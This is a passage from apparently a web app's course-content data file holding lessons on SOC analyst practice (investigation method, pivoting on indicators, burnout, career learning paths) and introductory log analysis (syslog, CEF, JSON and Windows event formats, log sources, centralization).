### Think Like a Detective

\`\`\`
INVESTIGATION APPROACH

1. OBSERVE
   └─ What exactly do you see?
   └─ What data is available?
   └─ What doesn't look right?

2. HYPOTHESIZE
   └─ What could explain this?
   └─ What are alternative explanations?
   └─ What would prove/disprove each?

3. TEST
   └─ Gather evidence for/against hypotheses
   └─ Look for corroborating data
   └─ Challenge your assumptions

4. CONCLUDE
   └─ What does the evidence show?
   └─ How confident are you?
   └─ What's still unknown?
\`\`\`

### Critical Thinking Skills

**Question Everything:**
- Why did this alert fire?
- Is this really malicious or could it be benign?
- What am I not seeing?
- What would an attacker do next?

**Avoid Cognitive Biases:**

| Bias | Description | Mitigation |
|------|-------------|------------|
| Confirmation | Seeking only supporting evidence | Actively look for contradicting data |
| Anchoring | Fixating on first piece of info | Consider alternatives before deciding |
| Availability | Relying on recent/memorable events | Check historical data and baselines |
| Tunnel Vision | Focusing too narrowly | Step back and see the bigger picture |

## Building Technical Intuition

### Pattern Recognition

\`\`\`
DEVELOP YOUR INTUITION

Level 1: Recognition
└─ "I've seen this before"
└─ Match current to past alerts

Level 2: Understanding
└─ "I know why this happens"
└─ Understand the underlying mechanism

Level 3: Prediction
└─ "I know what comes next"
└─ Anticipate attacker behavior

Level 4: Innovation
└─ "I can find what others miss"
└─ Develop new detection methods
\`\`\`

### The 10,000 Alert Rule

Like any skill, investigation improves with practice:

\`\`\`
PROGRESSION PATH

First 100 alerts:
├── Learning tools and interfaces
├── Following playbooks exactly
├── High dependence on documentation
└── Everything takes time

First 1,000 alerts:
├── Recognizing common patterns
├── Faster triage decisions
├── Starting to spot anomalies
└── Building intuition

10,000+ alerts:
├── Instant pattern recognition
├── Deep technical understanding
├── Complex investigation skills
└── Mentoring newer analysts
\`\`\`

## Practical Investigation Techniques

### Pivoting

\`\`\`
PIVOT FROM ONE INDICATOR TO FIND MORE

Start: Suspicious IP 185.234.218.45

Pivot 1: What domains resolve to this IP?
└─ evil-c2.com, malware-drop.net

Pivot 2: What other IPs do these domains use?
└─ 185.234.218.45, 91.109.190.68

Pivot 3: What hosts communicated with these IPs?
└─ WORKSTATION-08, FINANCE-PC-12

Pivot 4: What else did these hosts do?
└─ Executed suspicious PowerShell
└─ Created new scheduled tasks
\`\`\`

### Timeline Building

\`\`\`
RECONSTRUCT THE ATTACK TIMELINE

[09:15:22] Phishing email received
[09:22:35] User opens attachment
[09:22:37] Word macro executes
[09:22:38] PowerShell downloads payload
[09:22:45] Persistence established
[09:23:01] C2 beacon starts
[09:25:00] DETECTED by EDR

Questions to Ask:
• What happened before detection?
• What might have happened after?
• Are there gaps in our visibility?
\`\`\`

### Scope Determination

\`\`\`
ASSESSING INCIDENT SCOPE

Start with: One affected system

Expand Investigation:
├── What did this system communicate with?
├── Were credentials used on other systems?
├── Did malware spread to other hosts?
├── What data was accessed?
└── How long was the attacker present?

Scope Matrix:
           ┌─────────────┬─────────────┐
           │ Same Time   │ Diff Time   │
├──────────┼─────────────┼─────────────┤
│ Same Sys │ Same event  │ Persistence │
├──────────┼─────────────┼─────────────┤
│ Diff Sys │ Spreading   │ Campaign    │
└──────────┴─────────────┴─────────────┘
\`\`\`

## Documentation Habits

### Investigation Notes

\`\`\`
GOOD INVESTIGATION NOTES

[14:22:35] Alert received - PowerShell execution on FINANCE-PC-08
[14:23:00] Reviewed alert - encoded command detected
[14:25:00] Decoded command - downloads from 185.234.218.45
[14:27:00] Checked VirusTotal - IP flagged as malware
[14:30:00] Checked EDR - process tree shows Word→PowerShell
[14:32:00] Verdict: True positive - malware delivery
[14:35:00] Initiated containment - isolated host

WHY THIS MATTERS:
• You can pick up where you left off
• Others can understand your reasoning
• Supports post-incident review
• May be needed for legal proceedings
\`\`\`

## Continuous Improvement

\`\`\`
GROWING AS AN ANALYST

Daily:
├── Learn from each alert you investigate
├── Ask "why" for things you don't understand
└── Document new techniques and IOCs

Weekly:
├── Review recent threat intelligence
├── Catch up on security news
└── Practice with labs and CTFs

Monthly:
├── Deep dive into one topic
├── Work on certifications
└── Share knowledge with team

Annually:
├── Attend conferences (virtual counts!)
├── Take formal training
└── Set career development goals
\`\`\`
    `,
    keyTakeaways: [
      "Investigation requires a detective's mindset: observe, hypothesize, test, conclude",
      "Avoid cognitive biases by actively seeking contradicting evidence",
      "Pivoting from one indicator helps uncover the full scope of an attack",
      "Building timelines reconstructs the attack sequence",
      "Document everything - your notes support continuity and learning"
    ],
    practicalExercise: {
      title: "Investigation Skills Practice",
      description: "Work through investigation scenarios to build analytical skills.",
      steps: [
        "Take a provided alert and list your initial observations",
        "Generate three hypotheses that could explain the alert",
        "Identify what evidence you'd need to test each hypothesis",
        "Practice pivoting from the initial IOC to find related indicators",
        "Build a timeline of the scenario events"
      ]
    }
  },
  {
    id: "10.2",
    courseId: "soc-fundamentals",
    title: "Avoiding Analyst Burnout",
    content: `
# Avoiding Analyst Burnout

SOC work is demanding. Alert fatigue, shift work, and constant pressure can lead to burnout. Recognizing and preventing burnout is essential for career longevity.

## Understanding SOC Burnout

### What is Burnout?

\`\`\`
BURNOUT SYMPTOMS

Physical:
├── Chronic fatigue
├── Insomnia or sleep issues
├── Frequent illness
└── Headaches, muscle tension

Emotional:
├── Cynicism about work
├── Feeling ineffective
├── Loss of motivation
├── Emotional exhaustion

Behavioral:
├── Decreased performance
├── Increased mistakes
├── Isolation from colleagues
└── Neglecting personal responsibilities
\`\`\`

### SOC-Specific Stressors

| Stressor | Description |
|----------|-------------|
| Alert Fatigue | Thousands of alerts, many false positives |
| Shift Work | Irregular hours, night shifts, weekends |
| High Stakes | Mistakes can have serious consequences |
| Constant Learning | Always new threats, tools, techniques |
| Underappreciated | Security is invisible when it works |
| Resource Constraints | Understaffed, underfunded |

## Prevention Strategies

### Work-Life Balance

\`\`\`
HEALTHY BOUNDARIES

At Work:
├── Take your breaks (seriously!)
├── Step away from screens regularly
├── Don't skip lunch for alerts
└── Use vacation time

Off Work:
├── Disconnect from work communications
├── Have non-security hobbies
├── Exercise regularly
├── Maintain social connections
└── Get adequate sleep

Mental Shift:
├── "Not everything is an emergency"
├── "The SOC will survive without me for a break"
├── "My health enables my effectiveness"
\`\`\`

### Managing Alert Fatigue

\`\`\`
COMBATING ALERT FATIGUE

Tactical:
├── Advocate for alert tuning
├── Push for automation of routine tasks
├── Request better tooling when needed
├── Escalate unsustainable alert volumes

Personal:
├── Use the Pomodoro technique
├── Vary your tasks when possible
├── Take micro-breaks between alerts
└── Celebrate closing tickets (small wins!)

Team:
├── Rotate high-intensity tasks
├── Support colleagues during spikes
├── Share knowledge to reduce individual burden
└── Maintain team morale
\`\`\`

### Shift Work Survival

\`\`\`
HEALTHY SHIFT WORK PRACTICES

Before Night Shifts:
├── Sleep in before your shift
├── Avoid caffeine 6+ hours before sleep
└── Prepare meals in advance

During Night Shifts:
├── Stay hydrated
├── Light healthy snacks
├── Use bright lighting to stay alert
├── Short walks or stretches

After Night Shifts:
├── Wear sunglasses going home
├── Blackout curtains for sleeping
├── White noise for day sleeping
└── Don't force yourself awake

Rotation Tips:
├── Gradual schedule adjustment
├── Keep some consistent routines
└── Prioritize sleep above all
\`\`\`

## Building Resilience

### Mental Health Resources

\`\`\`
SUPPORT OPTIONS

Personal:
├── Talk to trusted friends/family
├── Maintain hobbies and interests
├── Practice stress reduction (meditation, exercise)

Professional:
├── Employee Assistance Programs (EAP)
├── Mental health professionals
├── Peer support groups

Community:
├── Security community mentors
├── Online forums and Discord servers
├── Local meetup groups
\`\`\`

### Knowing When to Ask for Help

Signs it's time to seek support:
- Feeling overwhelmed most days
- Difficulty sleeping or oversleeping
- Changes in appetite
- Loss of interest in things you enjoyed
- Difficulty concentrating
- Feeling hopeless or worthless
- Thoughts of self-harm

> "Asking for help is a sign of strength, not weakness."

## Career Sustainability

### Long-Term SOC Career

\`\`\`
SUSTAINABLE CAREER PRACTICES

Skill Development:
├── Continuous learning prevents stagnation
├── Seek varied experiences
├── Consider specialization paths
└── Mentor others (helps you too!)

Career Progression:
├── L1 → L2 → L3 pathway
├── Specializations (threat intel, IR, hunting)
├── Move to detection engineering
├── Leadership opportunities

Knowing When to Move:
├── Burnout that doesn't improve
├── Toxic work environment
├── No growth opportunities
├── Better opportunities elsewhere
\`\`\`

### Team Culture

A healthy SOC has:
- **Psychological safety** - OK to make mistakes
- **Workload management** - Sustainable alert volumes
- **Recognition** - Wins are celebrated
- **Growth focus** - Learning is prioritized
- **Support** - Team helps each other
    `,
    keyTakeaways: [
      "Burnout is a real risk in SOC work due to stress and alert fatigue",
      "Setting work-life boundaries is essential for long-term sustainability",
      "Shift work requires specific strategies for sleep and health",
      "Asking for help is a sign of strength, not weakness",
      "A healthy team culture helps prevent individual burnout"
    ],
    additionalResources: [
      { title: "Mental Health Resources", type: "article", url: "https://www.mentalhealth.gov" },
      { title: "SOC Analyst Wellbeing Guide", type: "article", url: "https://www.sans.org" }
    ]
  },
  {
    id: "10.3",
    courseId: "soc-fundamentals",
    title: "Continuous Learning Path",
    content: `
# Continuous Learning Path

The cybersecurity field evolves constantly. A commitment to continuous learning is essential for staying effective and advancing your career.

## Learning Roadmap

### SOC Analyst Career Progression

\`\`\`
TYPICAL SOC CAREER PATH

Level 1 Analyst (0-2 years)
├── Alert triage and monitoring
├── Following playbooks
├── Basic investigation
├── Documentation
└── Learning tools and processes

Level 2 Analyst (2-4 years)
├── Deep investigation
├── Escalation handling
├── Mentoring L1 analysts
├── Playbook development
└── Tool customization

Level 3 Analyst / Senior (4-7 years)
├── Complex incident response
├── Threat hunting
├── Detection engineering
├── Process improvement
└── Strategic planning

Specialization Paths:
├── Threat Intelligence
├── Incident Response
├── Threat Hunting
├── Detection Engineering
├── Security Architecture
├── Management
└── Red Team/Penetration Testing
\`\`\`

## Certification Roadmap

### Entry Level

| Certification | Focus | Study Time |
|---------------|-------|------------|
| CompTIA Security+ | Broad security fundamentals | 2-3 months |
| Google Cybersecurity | Entry-level skills | 3-6 months |
| SC-900 | Microsoft security basics | 1-2 months |

### SOC Focused

| Certification | Focus | Study Time |
|---------------|-------|------------|
| Blue Team Level 1 (BTL1) | SOC analyst skills | 2-3 months |
| CySA+ | Security analyst | 3-4 months |
| SC-200 | Microsoft Defender | 2-3 months |
| Splunk Core | SIEM fundamentals | 2-3 months |

### Advanced

| Certification | Focus | Study Time |
|---------------|-------|------------|
| Blue Team Level 2 (BTL2) | Advanced defense | 4-6 months |
| GCIH | Incident handling | 4-6 months |
| GCFA | Forensic analyst | 4-6 months |
| OSCP | Penetration testing | 6-12 months |

## Free Learning Resources

### Hands-On Labs

\`\`\`
FREE PRACTICE PLATFORMS

TryHackMe
├── SOC Level 1 path
├── Threat Intelligence path
├── Incident Response path
└── Great for beginners

LetsDefend
├── SOC analyst challenges
├── Real-world alert simulations
├── Malware analysis labs
└── Blue team focused

CyberDefenders
├── Blue team challenges
├── Memory forensics
├── Network analysis
└── Intermediate-advanced

Blue Team Labs Online
├── Incident response labs
├── Threat hunting exercises
├── Detection engineering
└── Subscription-based (some free)
\`\`\`

### Learning Content

\`\`\`
FREE LEARNING RESOURCES

Video Content:
├── John Hammond (YouTube)
├── The Cyber Mentor
├── NetworkChuck
├── Professor Messer
└── SANS webcasts

Blogs & Articles:
├── SANS Reading Room
├── Red Canary blog
├── Mandiant blog
├── DFIR reports
└── Medium security writers

Podcasts:
├── Darknet Diaries
├── Risky Business
├── Security Now
├── SANS Internet Stormcast
└── Smashing Security
\`\`\`

## Staying Current

### Daily Habits

\`\`\`
DAILY LEARNING ROUTINE (15-30 min)

Morning:
├── Check security news
│   ├── BleepingComputer
│   ├── The Hacker News
│   └── Krebs on Security
│
├── Review threat intel
│   ├── CISA alerts
│   ├── Vendor advisories
│   └── Twitter/X security community

During Work:
├── Learn from each alert
├── Ask questions about unfamiliar things
├── Document new techniques

Evening (optional):
├── Watch one educational video
├── Read one blog post
├── Practice one small lab
\`\`\`

### Weekly/Monthly

\`\`\`
STRUCTURED LEARNING

Weekly:
├── Deep dive on one topic (1-2 hours)
├── Complete one lab or challenge
├── Review and update notes

Monthly:
├── Work on certification progress
├── Attend a webinar or virtual event
├── Share something learned with team

Quarterly:
├── Assess skills gaps
├── Update learning plan
├── Set new goals
\`\`\`

## Building Your Network

### Community Involvement

\`\`\`
CYBERSECURITY COMMUNITY

Online:
├── Discord servers (TryHackMe, HackTheBox, etc.)
├── Reddit (r/cybersecurity, r/netsec)
├── Twitter/X security community
└── LinkedIn security groups

Local:
├── Security meetups (BSides, ISSA, OWASP)
├── Local infosec groups
├── User groups (Splunk, etc.)

Benefits:
├── Learn from others' experiences
├── Career opportunities
├── Mentorship possibilities
├── Stay motivated
└── Give back to others
\`\`\`
    `,
    keyTakeaways: [
      "SOC careers progress from L1 through specializations and leadership",
      "Certifications validate skills - start with Security+ or BTL1",
      "Free platforms like TryHackMe and LetsDefend provide hands-on practice",
      "Daily learning habits compound into significant growth over time",
      "Community involvement accelerates learning and opens opportunities"
    ],
    additionalResources: [
      { title: "TryHackMe", type: "tool", url: "https://tryhackme.com" },
      { title: "LetsDefend", type: "tool", url: "https://letsdefend.io" },
      { title: "CyberDefenders", type: "tool", url: "https://cyberdefenders.org" }
    ]
  },
  {
    id: "10.4",
    courseId: "soc-fundamentals",
    title: "Course Summary & Next Steps",
    content: `
# Course Summary & Next Steps

Congratulations on completing Blue Team & SOC Fundamentals! Let's review what you've learned and plan your next steps.

## What You've Learned

### Module 1: Introduction to Security Operations
\`\`\`
✓ SOC mission and core functions
✓ Team roles and responsibilities
✓ Essential SOC tools and technologies
✓ Workflows and shift handover procedures
\`\`\`

### Module 2: Cyber Threat Landscape
\`\`\`
✓ Threat actors and their motivations
✓ Common attack vectors
✓ Malware categories and behavior
✓ MITRE ATT&CK framework basics
\`\`\`

### Module 3: Log Analysis Fundamentals
\`\`\`
✓ Why logs matter for security
✓ Windows Event Log analysis
✓ Linux log analysis
✓ Network device logs
\`\`\`

### Module 4: SIEM Fundamentals
\`\`\`
✓ SIEM architecture and capabilities
✓ Dashboard and interface navigation
✓ Writing search queries
✓ Understanding correlation rules
\`\`\`

### Module 5: Alert Triage & Analysis
\`\`\`
✓ Alert anatomy and severity
✓ The triage process
✓ True vs false positive determination
✓ Documentation and escalation
\`\`\`

### Module 6: Threat Intelligence Basics
\`\`\`
✓ Types of threat intelligence
✓ IOC types and usage
✓ OSINT techniques
✓ Threat intel platforms
\`\`\`

### Module 7: Incident Response Introduction
\`\`\`
✓ IR lifecycle (NIST framework)
✓ Incident classification and severity
✓ Containment strategies
✓ Documentation and communication
\`\`\`

### Module 8: Endpoint Detection & Response
\`\`\`
✓ EDR capabilities and architecture
✓ Alerts and telemetry analysis
✓ Process tree analysis
✓ Investigation techniques
\`\`\`

### Module 9: Network Security Monitoring
\`\`\`
✓ Network fundamentals for SOC
✓ IDS/IPS systems
✓ Traffic analysis techniques
✓ Common network attacks
\`\`\`

### Module 10: SOC Analyst Best Practices
\`\`\`
✓ Investigation skills development
✓ Avoiding burnout
✓ Continuous learning paths
✓ Career development
\`\`\`

## Skills Self-Assessment

Rate your confidence in each area:

\`\`\`
SKILL ASSESSMENT

1 = Need more practice
2 = Basic understanding
3 = Comfortable
4 = Confident
5 = Could teach others

□ Alert triage and prioritization     [  ]
□ Log analysis (Windows/Linux)        [  ]
□ SIEM navigation and queries         [  ]
□ IOC research and validation         [  ]
□ Process tree analysis               [  ]
□ Network traffic analysis            [  ]
□ Incident documentation              [  ]
□ Escalation decisions                [  ]

Focus your next learning on areas rated 1-2
\`\`\`

## Recommended Next Steps

### Immediate (Next 30 Days)

\`\`\`
ACTION ITEMS

1. Practice What You Learned
   ├── Complete the hands-on exercises
   ├── Do 10 challenges on TryHackMe SOC path
   └── Practice in LetsDefend simulator

2. Build Your Lab
   ├── Set up a home lab (VirtualBox/VMware)
   ├── Install Windows VM for log analysis
   ├── Practice with SIEM (Splunk free, ELK)
   └── Try open-source EDR (Wazuh, Velociraptor)

3. Get Certified
   ├── Register for first certification exam
   ├── BTL1 or Security+ recommended
   └── Create a study schedule
\`\`\`

### Medium Term (3-6 Months)

\`\`\`
CAREER DEVELOPMENT

Skills:
├── Deepen SIEM expertise (specific platform)
├── Learn scripting (Python for security)
├── Practice malware analysis basics
└── Study network forensics

Experience:
├── Apply for entry-level SOC positions
├── Seek internships if available
├── Contribute to open-source projects
└── Participate in CTF competitions

Networking:
├── Join security Discord servers
├── Attend local security meetups
├── Connect with professionals on LinkedIn
└── Find a mentor
\`\`\`

### Long Term (1-2 Years)

\`\`\`
CAREER PATH OPTIONS

Generalist Path:
L1 Analyst → L2 Analyst → L3 Analyst → IR Lead

Specialist Paths:
├── Threat Intelligence: CTI Analyst → TI Lead
├── Incident Response: IR Analyst → IR Lead
├── Threat Hunting: Hunter → Hunt Lead
├── Detection Engineering: Det Engineer → Lead
└── Management: Team Lead → SOC Manager

Advanced Certifications:
├── GCIH (Incident Handler)
├── GCFA (Forensic Analyst)
├── OSCP (Penetration Testing)
└── CISSP (Security Management)
\`\`\`

## Final Advice

### From Security Professionals

> "Stay curious. The best analysts are the ones who always ask 'why?'"

> "It's okay not to know everything. The skill is knowing how to find the answer."

> "Take care of yourself. Burnout is real, and you can't protect others if you're broken."

> "Share your knowledge. Teaching others is the best way to solidify your own understanding."

> "The threat actors never stop learning. Neither should you."

## Keep in Touch

\`\`\`
CONTINUE YOUR JOURNEY

Practice Platforms:
├── TryHackMe: tryhackme.com
├── LetsDefend: letsdefend.io
├── CyberDefenders: cyberdefenders.org

Community:
├── InfoSecDairies Telegram: @infosecdairiess
├── Discord security servers
├── Local security meetups

Stay Updated:
├── Security news sites
├── Vendor blogs and research
├── Twitter/X security community
\`\`\`

---

## 🎉 Congratulations!

You've completed **Blue Team & SOC Fundamentals**!

You now have the knowledge foundation to:
- Work as an entry-level SOC analyst
- Triage and investigate security alerts
- Use SIEM, EDR, and other SOC tools
- Contribute to incident response efforts
- Continue growing in your security career

**What's next?** Take the final certification exam to validate your knowledge, then start applying what you've learned!

Welcome to the blue team. The defenders need you. 🛡️
    `,
    keyTakeaways: [
      "You've built a solid foundation across all core SOC analyst skills",
      "Self-assessment helps identify areas for focused improvement",
      "Hands-on practice through labs and CTFs reinforces learning",
      "Career progression comes from continuous learning and specialization",
      "The security community is supportive - engage and give back"
    ],
    practicalExercise: {
      title: "Create Your Learning Plan",
      description: "Develop a personalized plan for continued growth.",
      steps: [
        "Complete the skills self-assessment honestly",
        "Identify your top 3 areas for improvement",
        "Choose your first certification goal",
        "Sign up for at least one practice platform",
        "Schedule 30 minutes of daily learning time"
      ]
    }
  },
  // ===== LOG ANALYSIS FOR BEGINNERS COURSE =====
  // Module 1: Introduction to Security Logs
  {
    id: "1.1",
    courseId: "log-analysis",
    title: "What are Security Logs?",
    content: `
# What are Security Logs?

**Security logs** are records of events that occur within your IT environment. They are the digital footprints left by every action, connection, and transaction in your systems.

## Why Logs Matter in Security

Logs are the **foundation of security monitoring and incident response**. Without logs, we're essentially blind to what's happening in our environment.

> "Logs are like the black box recorder of an airplane—they tell us what happened, when, and often why."

### Key Uses of Security Logs

| Use Case | Description |
|----------|-------------|
| **Threat Detection** | Identify malicious activity through patterns and anomalies |
| **Incident Investigation** | Reconstruct what happened during a security incident |
| **Compliance** | Meet regulatory requirements (PCI-DSS, HIPAA, SOX) |
| **Forensics** | Provide evidence for legal proceedings |
| **Troubleshooting** | Debug application and system issues |

## What Gets Logged?

Almost everything in IT can generate logs:

### Endpoint Logs
- User logins and logoffs
- Process execution
- File access and modifications
- Registry changes (Windows)
- Privilege escalation

### Network Logs
- Firewall allow/deny decisions
- DNS queries
- HTTP/HTTPS requests
- VPN connections
- NetFlow data

### Application Logs
- Database queries
- API calls
- Authentication attempts
- Error messages
- Transaction records

### Cloud Logs
- Resource access
- Configuration changes
- IAM activities
- API calls

## The 5 W's of Log Analysis

Every log entry should help answer:

1. **Who** - Which user or service account?
2. **What** - What action was performed?
3. **When** - Timestamp of the event
4. **Where** - Source and destination (IP, hostname)
5. **Why** - Context and outcome

## Log Levels / Severity

Most logging systems use severity levels:

\`\`\`
┌─────────────┬────────────────────────────────────┐
│ Level       │ Description                        │
├─────────────┼────────────────────────────────────┤
│ EMERGENCY   │ System is unusable                 │
│ ALERT       │ Immediate action required          │
│ CRITICAL    │ Critical conditions                │
│ ERROR       │ Error conditions                   │
│ WARNING     │ Warning conditions                 │
│ NOTICE      │ Normal but significant             │
│ INFO        │ Informational messages             │
│ DEBUG       │ Debug-level messages               │
└─────────────┴────────────────────────────────────┘
\`\`\`

## Challenges in Log Analysis

### Volume
Modern environments generate **millions of events per day**. A single busy server can produce gigabytes of logs daily.

### Variety
Different systems use different formats, making correlation challenging.

### Velocity
Real-time threat detection requires processing logs as they're generated.

### Veracity
Not all logs are equally reliable or complete.

## The Security Analyst's Perspective

As a security analyst, you'll approach logs with specific questions:

- Is this activity expected or suspicious?
- Does this pattern indicate an attack?
- What's the timeline of events?
- Who or what is responsible?
- What's the impact?

Mastering log analysis is one of the most valuable skills for any security professional!
    `,
    keyTakeaways: [
      "Logs are records of events that provide visibility into IT environments",
      "Security logs are essential for detection, investigation, and compliance",
      "The 5 W's (Who, What, When, Where, Why) guide log analysis",
      "Log severity levels help prioritize events",
      "Volume, variety, and velocity are key challenges in log analysis"
    ],
    additionalResources: [
      { title: "NIST Guide to Computer Security Log Management", type: "documentation" },
      { title: "SANS Log Management Best Practices", type: "article" }
    ]
  },
  {
    id: "1.2",
    courseId: "log-analysis",
    title: "Common Log Formats",
    content: `
# Common Log Formats

Understanding log formats is essential for parsing and analyzing security events. Different systems and vendors use different formats, but several standards have emerged.

## Syslog Format

**Syslog** is the most widely used logging standard, especially in Unix/Linux environments and network devices.

### Traditional Syslog (RFC 3164)

\`\`\`
<priority>timestamp hostname process[pid]: message
\`\`\`

**Example:**
\`\`\`
<34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8
\`\`\`

### Modern Syslog (RFC 5424)

\`\`\`
<priority>version timestamp hostname app-name procid msgid structured-data msg
\`\`\`

**Example:**
\`\`\`
<165>1 2023-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut="3"] BOMAn application event log entry...
\`\`\`

### Priority Calculation
Priority = (Facility × 8) + Severity

| Facility | Value | Description |
|----------|-------|-------------|
| kern | 0 | Kernel messages |
| user | 1 | User-level messages |
| auth | 4 | Security/auth messages |
| authpriv | 10 | Security/auth (private) |
| local0-7 | 16-23 | Custom use |

## CEF (Common Event Format)

**CEF** is a standardized format developed by ArcSight, widely used in SIEM integrations.

\`\`\`
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
\`\`\`

**Example:**
\`\`\`
CEF:0|Security|Firewall|1.0|100|Connection Blocked|7|src=192.168.1.100 dst=10.0.0.1 spt=12345 dpt=443 proto=TCP
\`\`\`

### CEF Extension Fields
- **src/dst** - Source/Destination IP
- **spt/dpt** - Source/Destination Port
- **act** - Action taken
- **msg** - Human-readable message
- **cs1-cs6** - Custom strings

## JSON Format

**JSON** is increasingly popular for logs due to its flexibility and machine readability.

\`\`\`json
{
  "timestamp": "2023-10-11T22:14:15.003Z",
  "level": "warning",
  "source": "firewall",
  "action": "blocked",
  "src_ip": "192.168.1.100",
  "dst_ip": "10.0.0.1",
  "dst_port": 443,
  "protocol": "TCP",
  "message": "Suspicious outbound connection blocked"
}
\`\`\`

### Advantages of JSON
- Self-describing (field names included)
- Nested structures supported
- Easy to parse programmatically
- Human-readable

## Windows Event Log Format (EVTX)

Windows uses a structured XML-based format internally.

\`\`\`xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">john.doe</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">192.168.1.50</Data>
  </EventData>
</Event>
\`\`\`

## Apache/NCSA Combined Log Format

Common for web server access logs:

\`\`\`
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
\`\`\`

**Example:**
\`\`\`
192.168.1.100 - john [11/Oct/2023:22:14:15 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
\`\`\`

## LEEF (Log Event Extended Format)

IBM's format similar to CEF:

\`\`\`
LEEF:Version|Vendor|Product|Version|EventID|
\`\`\`

## Parsing Tips

1. **Identify the format first** - Look for patterns, delimiters, and structure
2. **Use the right tools** - Regex, parsers, or SIEM built-in parsing
3. **Normalize fields** - Map vendor-specific fields to common names
4. **Handle timestamps** - Convert to UTC, parse correctly
5. **Extract key fields** - Focus on security-relevant data
    `,
    keyTakeaways: [
      "Syslog is the most common format for Unix/Linux and network devices",
      "CEF provides a standardized format for SIEM integration",
      "JSON is increasingly popular for its flexibility and readability",
      "Windows uses XML-based EVTX format with Event IDs",
      "Understanding log formats is essential for effective parsing and analysis"
    ]
  },
  {
    id: "1.3",
    courseId: "log-analysis",
    title: "Log Sources Overview",
    content: `
# Log Sources Overview

Security analysts work with logs from many different sources. Understanding what each source provides helps you know where to look during investigations.

## Endpoint Log Sources

### Windows Systems

| Log Type | Location | Security Value |
|----------|----------|----------------|
| Security | Event Viewer | Authentication, privilege use |
| System | Event Viewer | Service changes, errors |
| Application | Event Viewer | App crashes, errors |
| PowerShell | Event Viewer | Script execution |
| Sysmon | Event Viewer | Process, network, file events |

### Linux Systems

| Log File | Location | Security Value |
|----------|----------|----------------|
| auth.log/secure | /var/log | Authentication events |
| syslog | /var/log | System messages |
| kern.log | /var/log | Kernel messages |
| audit.log | /var/log/audit | SELinux/auditd events |
| lastlog | /var/log | Last login info |

### macOS Systems
- Unified Log (Console.app)
- /var/log/system.log
- /var/log/install.log

## Network Device Logs

### Firewalls
- **What they log:** Traffic allow/deny, NAT translations, VPN connections
- **Key fields:** src_ip, dst_ip, port, action, rule_id
- **Popular vendors:** Palo Alto, Fortinet, Cisco ASA, Check Point

### Proxies / Web Gateways
- **What they log:** HTTP requests, URLs, user agents, response codes
- **Key fields:** url, user, category, action, bytes
- **Popular vendors:** Zscaler, Bluecoat, Squid

### DNS Servers
- **What they log:** DNS queries and responses
- **Key fields:** query_name, query_type, response, client_ip
- **Use cases:** Detecting C2, DGA, data exfiltration

### IDS/IPS
- **What they log:** Signature matches, anomaly detections
- **Key fields:** signature_id, severity, src_ip, dst_ip
- **Popular vendors:** Snort, Suricata, Cisco Firepower

## Application Logs

### Web Servers
- Apache access/error logs
- Nginx access/error logs
- IIS logs (W3C format)

### Databases
- Query logs
- Authentication logs
- Error logs
- Audit logs

### Email Systems
- Message tracking logs
- Authentication logs
- Spam/phishing detection logs

## Cloud Service Logs

### AWS
| Service | Log Type |
|---------|----------|
| CloudTrail | API activity |
| VPC Flow Logs | Network traffic |
| GuardDuty | Threat detection |
| S3 Access Logs | Bucket access |

### Azure
| Service | Log Type |
|---------|----------|
| Activity Log | Management operations |
| Azure AD Sign-ins | Authentication |
| NSG Flow Logs | Network traffic |
| Defender for Cloud | Security alerts |

### Google Cloud
- Cloud Audit Logs
- VPC Flow Logs
- Cloud Armor logs

## Identity & Access Logs

### Active Directory
- Domain Controller Security logs
- LDAP query logs
- Group Policy logs

### Identity Providers (IdP)
- Okta, Azure AD, Ping
- SSO authentication logs
- MFA events

## EDR/XDR Telemetry

Modern endpoint detection tools provide rich telemetry:
- Process creation with command lines
- Network connections
- File system activity
- Registry modifications
- Memory operations

## Prioritizing Log Sources

For security monitoring, prioritize:

1. **Authentication logs** - Who accessed what
2. **Firewall/Network logs** - What traffic occurred
3. **Endpoint detection** - What executed on systems
4. **DNS logs** - Domain communication
5. **Email logs** - Phishing detection

\`\`\`
┌────────────────────────────────────────────────┐
│              SOC Log Priority                  │
├────────────────────────────────────────────────┤
│ 1. Auth (AD, VPN, Cloud)      ████████████ HIGH│
│ 2. Network (FW, Proxy, DNS)   ██████████ HIGH  │
│ 3. Endpoint (EDR, Sysmon)     ████████ HIGH    │
│ 4. Email (O365, Exchange)     ██████ MEDIUM    │
│ 5. Application (Web, DB)      ████ MEDIUM      │
│ 6. Cloud (AWS, Azure, GCP)    ██████ MEDIUM    │
└────────────────────────────────────────────────┘
\`\`\`
    `,
    keyTakeaways: [
      "Endpoints provide authentication, process, and file activity logs",
      "Network devices log traffic flows, DNS queries, and security decisions",
      "Cloud services have their own logging systems (CloudTrail, Azure Activity)",
      "Authentication logs are the highest priority for security monitoring",
      "EDR provides rich telemetry beyond traditional OS logs"
    ]
  },
  {
    id: "1.4",
    courseId: "log-analysis",
    title: "Log Collection & Centralization",
    content: `
# Log Collection & Centralization

Collecting logs from across your environment and centralizing them is critical for effective security monitoring.

## Why Centralize Logs?

### Without Centralization
\`\`\`
[Server 1] ─── Local logs only
[Server 2] ─── Local logs only
[Firewall] ─── Local logs only
[Workstations] ─── Local logs only

❌ Analyst must access each system
❌ No correlation possible
❌ Logs may be deleted by attackers
❌ No long-term retention
\`\`\`

### With Centralization
\`\`\`
[Server 1] ──────┐
[Server 2] ──────┼──→ [SIEM] ──→ [Analyst]
[Firewall] ──────┤        │
[Workstations] ──┘        ↓
                    [Storage/Archive]

✅ Single pane of glass
✅ Cross-source correlation
✅ Protected from tampering
✅ Long-term retention
\`\`\`

## Log Collection Methods

### Agent-Based Collection

Agents installed on endpoints forward logs.

**Pros:**
- Rich data collection
- Works across networks
- Can filter at source

**Cons:**
- Agent deployment needed
- Resource overhead
- Agent management

**Common Agents:**
- Elastic Agent / Beats
